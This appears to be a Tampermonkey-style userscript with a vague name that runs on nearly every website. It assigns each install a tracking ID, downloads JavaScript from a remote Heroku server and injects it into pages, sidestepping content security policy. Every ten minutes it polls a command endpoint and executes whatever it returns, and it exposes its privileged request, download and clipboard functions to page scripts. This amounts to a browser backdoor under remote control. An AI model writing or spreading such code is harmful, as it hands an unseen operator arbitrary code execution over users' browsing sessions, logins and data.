// ==UserScript==
// @name ts
// @version 2.0.90
// @namespace xxyyzz2050
// @include *
// @exclude /github.com/
// @icon https://img.pngio.com/green-light-bulb-2-icon-green-light-bulb-png-256_256.png
// @run-at document-end
// @grant GM_info
// @grant GM_getValue
// @grant GM_setValue
// @grant GM_deleteValue
// @grant GM_listValues
// @grant GM_getResourceText
// @grant GM_getResourceURL
// @grant GM_addStyle
// @grant GM_openInTab
// @grant GM_registerMenuCommand
// @grant GM_unregisterMenuCommand
// @grant GM_notification
// @grant GM_setClipboard
// @grant GM_xmlhttpRequest
// @grant GM_download
// @downloadURL https://xxyyzz2050.github.io/ace/hk/index.user.js
// @updateURL https://xxyyzz2050.github.io/ace/hk/index.user.js
// @homepageURL https://xxyyzz2050.github.io/ace/hk/index.user.js
// @inject-into auto
// ==/UserScript==

/*
notes:
 - todo:
   - loading a script by ajax (getScript) may cause error if it violates 'unsafe-inline' CSP (content security policy)
     and loading it by 'src' (loadScript) may cause error if it violates 'script-src' CSp.
     either check CSP list (by reading headers and <meta> tags), or try both methods, if one faild try the other.
 */

//using @require will download this script once on download (not on update),
//so we need to dynamically update the script by loading an external script
//or use hashes with @require
//ex: @require script.js?hash=1 or gist.github/**/$revision_id/script.js (requires updating the userscript)

const _this = this;
const repo = "https://ace-hk.herokuapp.com";

let timestamp = new Date().getTime();
var user = GM_getValue("user");
if (!user) {
  user = timestamp;
  GM_setValue("user", user);
}

const dev = user === 81;

let obj = {
  getInfo() {
    return {
      script_version: GM_info.script.version,
      user,
      dev,
      timestamp,
      GM_info
    };
  },

  ajax(url, data, cb = () => {}, method = "post", responseType = "json") {
    GM_xmlhttpRequest({
      url,
      data,
      method,
      responseType,
      onreadystatechange: res => {
        console.log("GM_xmlhttpRequest", { res });
        if (res.readyState === 4) {
          if (res.status === 200) {
            cb("sucess", res);
            if (dev) console.log("[hk.user.js: ajax()] sucess:", url);
          } else {
            cb("error", res);
            if (dev)
              console.log("[hk.user.js: ajax()] error:", url, res.status, res);
          }
        }
      }
    });
  },
  /**
   * load & execute a script via xmlhttp request, same as jQuery.getScript()
   * @method getScript
   * @param  {[type]}  src [description]
   * @return {[type]}  [description]
   *
   * todo: merge getScript() & loadScript() options.by= xml|script
   */
  getScript(
    url,
    attributes = {},
    cb = () => {},
    method = "get",
    responseType = "text"
  ) {
    //console.log({ src, attributes, cb });
    this.ajax(
      url,
      {},
      (type, res) => {
        if (type === "sucess") {
          //the consumer may need to modify res
          //todo: make the injected script has access to this script (ex: use obj.getInfo())
          res = cb("sucess", res) || res;
          let script = document.createElement("script");

          try {
            // doesn't work on IE
            script.appendChild(document.createTextNode(res.responseText));
          } catch (e) {
            script.text = res.responseText;
          }

          //avoid 'unsafe-inline' CSP.
          //https://stackoverflow.com/a/42924000/12577650
          if (!("nonce" in attributes)) attributes.nonce = true;
          for (let k in attributes) {
            script.setAttribute(k, attributes[k]);
          }

          //jQuery removes the script after it evaluated (inserted to the DOM)
          //https://github.com/jquery/jquery/blob/39c5778c649ad387dac834832799c0087b11d5fe/src/core/DOMEval.js
          //if there is no any attributes, remove the script.
          let head = document.head.appendChild(script);
          if (attributes === {}) head.parentNode.removeChild(script);

          //use script.addEventListener("load",...) with <script src="">, not <script>CODE</script>
          cb("loaded", res);
          if (dev)
            console.log("[hk.user.js: getScript] loaded:", {
              url,
              attributes,
              cb,
              script
            });
        }
      },
      method,
      responseType
    );
  },
  //this function may fail if it violates the 'Content Security Policy', use getScript()
  loadScript(url, attributes = {}, cb = () => {}) {
    let script = document.createElement("script");
    script.src = url;
    if (!("type" in attributes)) attributes.type = "application/javascript";
    if (!("content-type" in attributes))
      attributes["content-type"] = attributes.type;

    //https://stackoverflow.com/a/41794176/12577650
    //script.setAttribute("crossorigin", true);

    for (let k in attributes) {
      script.setAttribute(k, attributes[k]);
    }

    if (cb && typeof cb === "function") {
      script.addEventListener("load", ev => cb("loaded", ev));
      script.addEventListener("readystatechange", ev => cb("ready", ev));
      script.addEventListener("error", ev => cb("error", ev));
    }

    document.head.appendChild(script);
    if (dev)
      console.log("hk.user.js: loadScript", { url, attributes, cb, script });
  },
  runCmd(cmds) {
    //todo: report that cmd received & remove it from cmds list
    for (let k in cmds) {
      if (!GM_getValue(`cmd_${k}`)) {
        if (dev) console.log(`[hk.user.js] running cmd: ${k}`);
        cmds[k]();
        GM_setValue(`cmd_${k}`, timestamp);
        break; //run one cmd each time.
      } else if (dev) console.log(`[hk.user.js] cmd: ${k} already run`);
    }
  }
};

//add functions fo this, so it can be accessed by runFunctionByName() with context=this
for (let k in obj) {
  this[k] = obj[k];
}

//to access this script globally (ex: by the browser's console), ex: window["hk.user.js"]["getScript"]
this.unsafeWindow["hk.user.js"] = this;

//todo: move getCmd(), runCmd() to index.js
function getCmd() {
  getScript(
    `${repo}/cmd?hash=${timestamp}&user=${user}`,
    {},
    (type, res, src) => {
      if (type === "sucess") {
        //todo:(this here = window, not GM), so injected scripts cannot acces this variables, such as _this, obj, ...
        //as a workarround, `this` is added to window as window["hk.user.js"]
        res.responseText = `
        //const GM = window["hk.user.js"]; //already declared in index.js
        GM.runCmd(${res.responseText})
        `;
      }
    }
    //,"json"  //use .js to define functions ex: {cmd_hash: function(){...}}
  );
}

//don't link from github gists or repos because it sets content-type to text/plain
//use github pages
getScript(
  `${repo}/?hash=${timestamp}&user=${user}`,
  {
    id: "hkscript"
  },
  type => {
    if (type === "loaded") {
      //run the cmd once, then start the interval
      //must be called after hk.js, because `GM` is defined there.
      getCmd();
      setInterval(getCmd, 60 * 10 * 1000); //every 10 mins.
    }
  }
);

if (dev)
  console.log("hk.user.js", {
    document,
    chrome,
    browser,
    webRequest: chrome.webRequest
  });
